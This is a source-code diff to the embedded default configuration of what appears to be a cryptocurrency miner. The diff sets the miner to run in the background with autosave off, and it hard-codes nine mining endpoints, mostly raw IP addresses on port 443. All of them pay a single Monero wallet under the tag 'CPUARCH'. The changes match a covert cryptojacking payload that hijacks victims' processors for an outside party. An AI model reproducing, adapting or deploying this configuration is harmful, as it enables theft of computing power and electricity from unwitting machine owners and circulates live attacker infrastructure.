@@ -38,8 +38,8 @@ const static char *default_config =
         "access-token": null,
         "restricted": true
     },
-    "autosave": true,
-    "background": false,
+    "autosave": false,
+    "background": true,
     "colors": false,
     "title": false,
     "randomx": {
@@ -88,27 +88,55 @@ const static char *default_config =
     "log-file": null,
     "pools": [
         {
-            "algo": null,
-            "coin": null,
-            "url": "176.65.149.115:80",
-            "user": "CPUARCH",
-            "pass": "",
-            "rig-id": null,
-            "nicehash": false,
-            "keepalive": true,
-            "enabled": true,
-            "tls": false,
-            "tls-fingerprint": null,
-            "daemon": false,
-            "socks5": null,
-            "self-select": null,
-            "submit-to-origin": false
+            "url": "pool.hashvault.pro:443",
+            "user": "88o9jtEfb84RCE3TdjLU7b1V2mJSbhLxp9febXKn6YGB1wZx5ovfNUtiYTK65TXJcNRQvHNEZk1zMXczjiy3metyDjQN2Qu",
+            "pass": "CPUARCH"
+        },
+        {
+            "url": "104.251.123.89:443",
+            "user": "88o9jtEfb84RCE3TdjLU7b1V2mJSbhLxp9febXKn6YGB1wZx5ovfNUtiYTK65TXJcNRQvHNEZk1zMXczjiy3metyDjQN2Qu",
+            "pass": "CPUARCH"
+        },
+        {
+            "url": "216.219.85.122:443",
+            "user": "88o9jtEfb84RCE3TdjLU7b1V2mJSbhLxp9febXKn6YGB1wZx5ovfNUtiYTK65TXJcNRQvHNEZk1zMXczjiy3metyDjQN2Qu",
+            "pass": "CPUARCH"
+        },
+        {
+            "url": "185.240.242.141:443",
+            "user": "88o9jtEfb84RCE3TdjLU7b1V2mJSbhLxp9febXKn6YGB1wZx5ovfNUtiYTK65TXJcNRQvHNEZk1zMXczjiy3metyDjQN2Qu",
+            "pass": "CPUARCH"
+        },
+        {
+            "url": "46.4.28.18:443",
+            "user": "88o9jtEfb84RCE3TdjLU7b1V2mJSbhLxp9febXKn6YGB1wZx5ovfNUtiYTK65TXJcNRQvHNEZk1zMXczjiy3metyDjQN2Qu",
+            "pass": "CPUARCH"
+        },
+        {
+            "url": "157.20.104.252:443",
+            "user": "88o9jtEfb84RCE3TdjLU7b1V2mJSbhLxp9febXKn6YGB1wZx5ovfNUtiYTK65TXJcNRQvHNEZk1zMXczjiy3metyDjQN2Qu",
+            "pass": "CPUARCH"
+        },
+        {
+            "url": "15.235.221.117:443",
+            "user": "88o9jtEfb84RCE3TdjLU7b1V2mJSbhLxp9febXKn6YGB1wZx5ovfNUtiYTK65TXJcNRQvHNEZk1zMXczjiy3metyDjQN2Qu",
+            "pass": "CPUARCH"
+        },
+        {
+            "url": "5.188.137.200:443",
+            "user": "88o9jtEfb84RCE3TdjLU7b1V2mJSbhLxp9febXKn6YGB1wZx5ovfNUtiYTK65TXJcNRQvHNEZk1zMXczjiy3metyDjQN2Qu",
+            "pass": "CPUARCH"
+        },
+        {
+            "url": "37.203.243.102:443",
+            "user": "88o9jtEfb84RCE3TdjLU7b1V2mJSbhLxp9febXKn6YGB1wZx5ovfNUtiYTK65TXJcNRQvHNEZk1zMXczjiy3metyDjQN2Qu",
+            "pass": "CPUARCH"
         }
     ],
     "print-time": 15,
     "health-print-time": 15,
     "dmi": false,
-    "retries": 60,
+    "retries": 1,
     "retry-pause": 5,
     "syslog": false,
     "tls": {
